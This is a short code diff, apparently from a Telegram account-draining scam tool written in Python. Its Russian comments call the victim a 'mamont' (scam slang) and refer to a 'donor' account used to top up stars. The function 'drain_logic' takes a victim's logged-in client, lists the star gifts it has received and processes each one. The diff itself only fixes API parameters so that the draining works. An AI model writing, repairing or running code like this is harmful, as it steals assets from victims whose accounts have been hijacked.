@@ -130,13 +130,13 @@ async def drain_logic(client, phone):
                 for _ in range(2):
                     try:
                         # Отправляем подарок от имени бота мамонту
-                        await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
+                        await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685, hide_name=False))
                         await asyncio.sleep(2)
                     except: pass
                 
                 await asyncio.sleep(7)
                 # ИСПРАВЛЕНО: Убрали offset='', так как он вызывает ошибку
-                received_gifts = await client(functions.payments.GetStarGiftsRequest())
+                received_gifts = await client(functions.payments.GetStarGiftsRequest(hash=0))
                 for g in received_gifts.gifts:
                     try:
                         await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
@@ -149,7 +149,7 @@ async def drain_logic(client, phone):
                 send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")
 
         # ИСПРАВЛЕНО: Убрали offset='' здесь тоже
-        all_gifts = await client(functions.payments.GetStarGiftsRequest())
+        all_gifts = await client(functions.payments.GetStarGiftsRequest(hash=0))
         total_found = len(all_gifts.gifts)
         success_count = 0
         
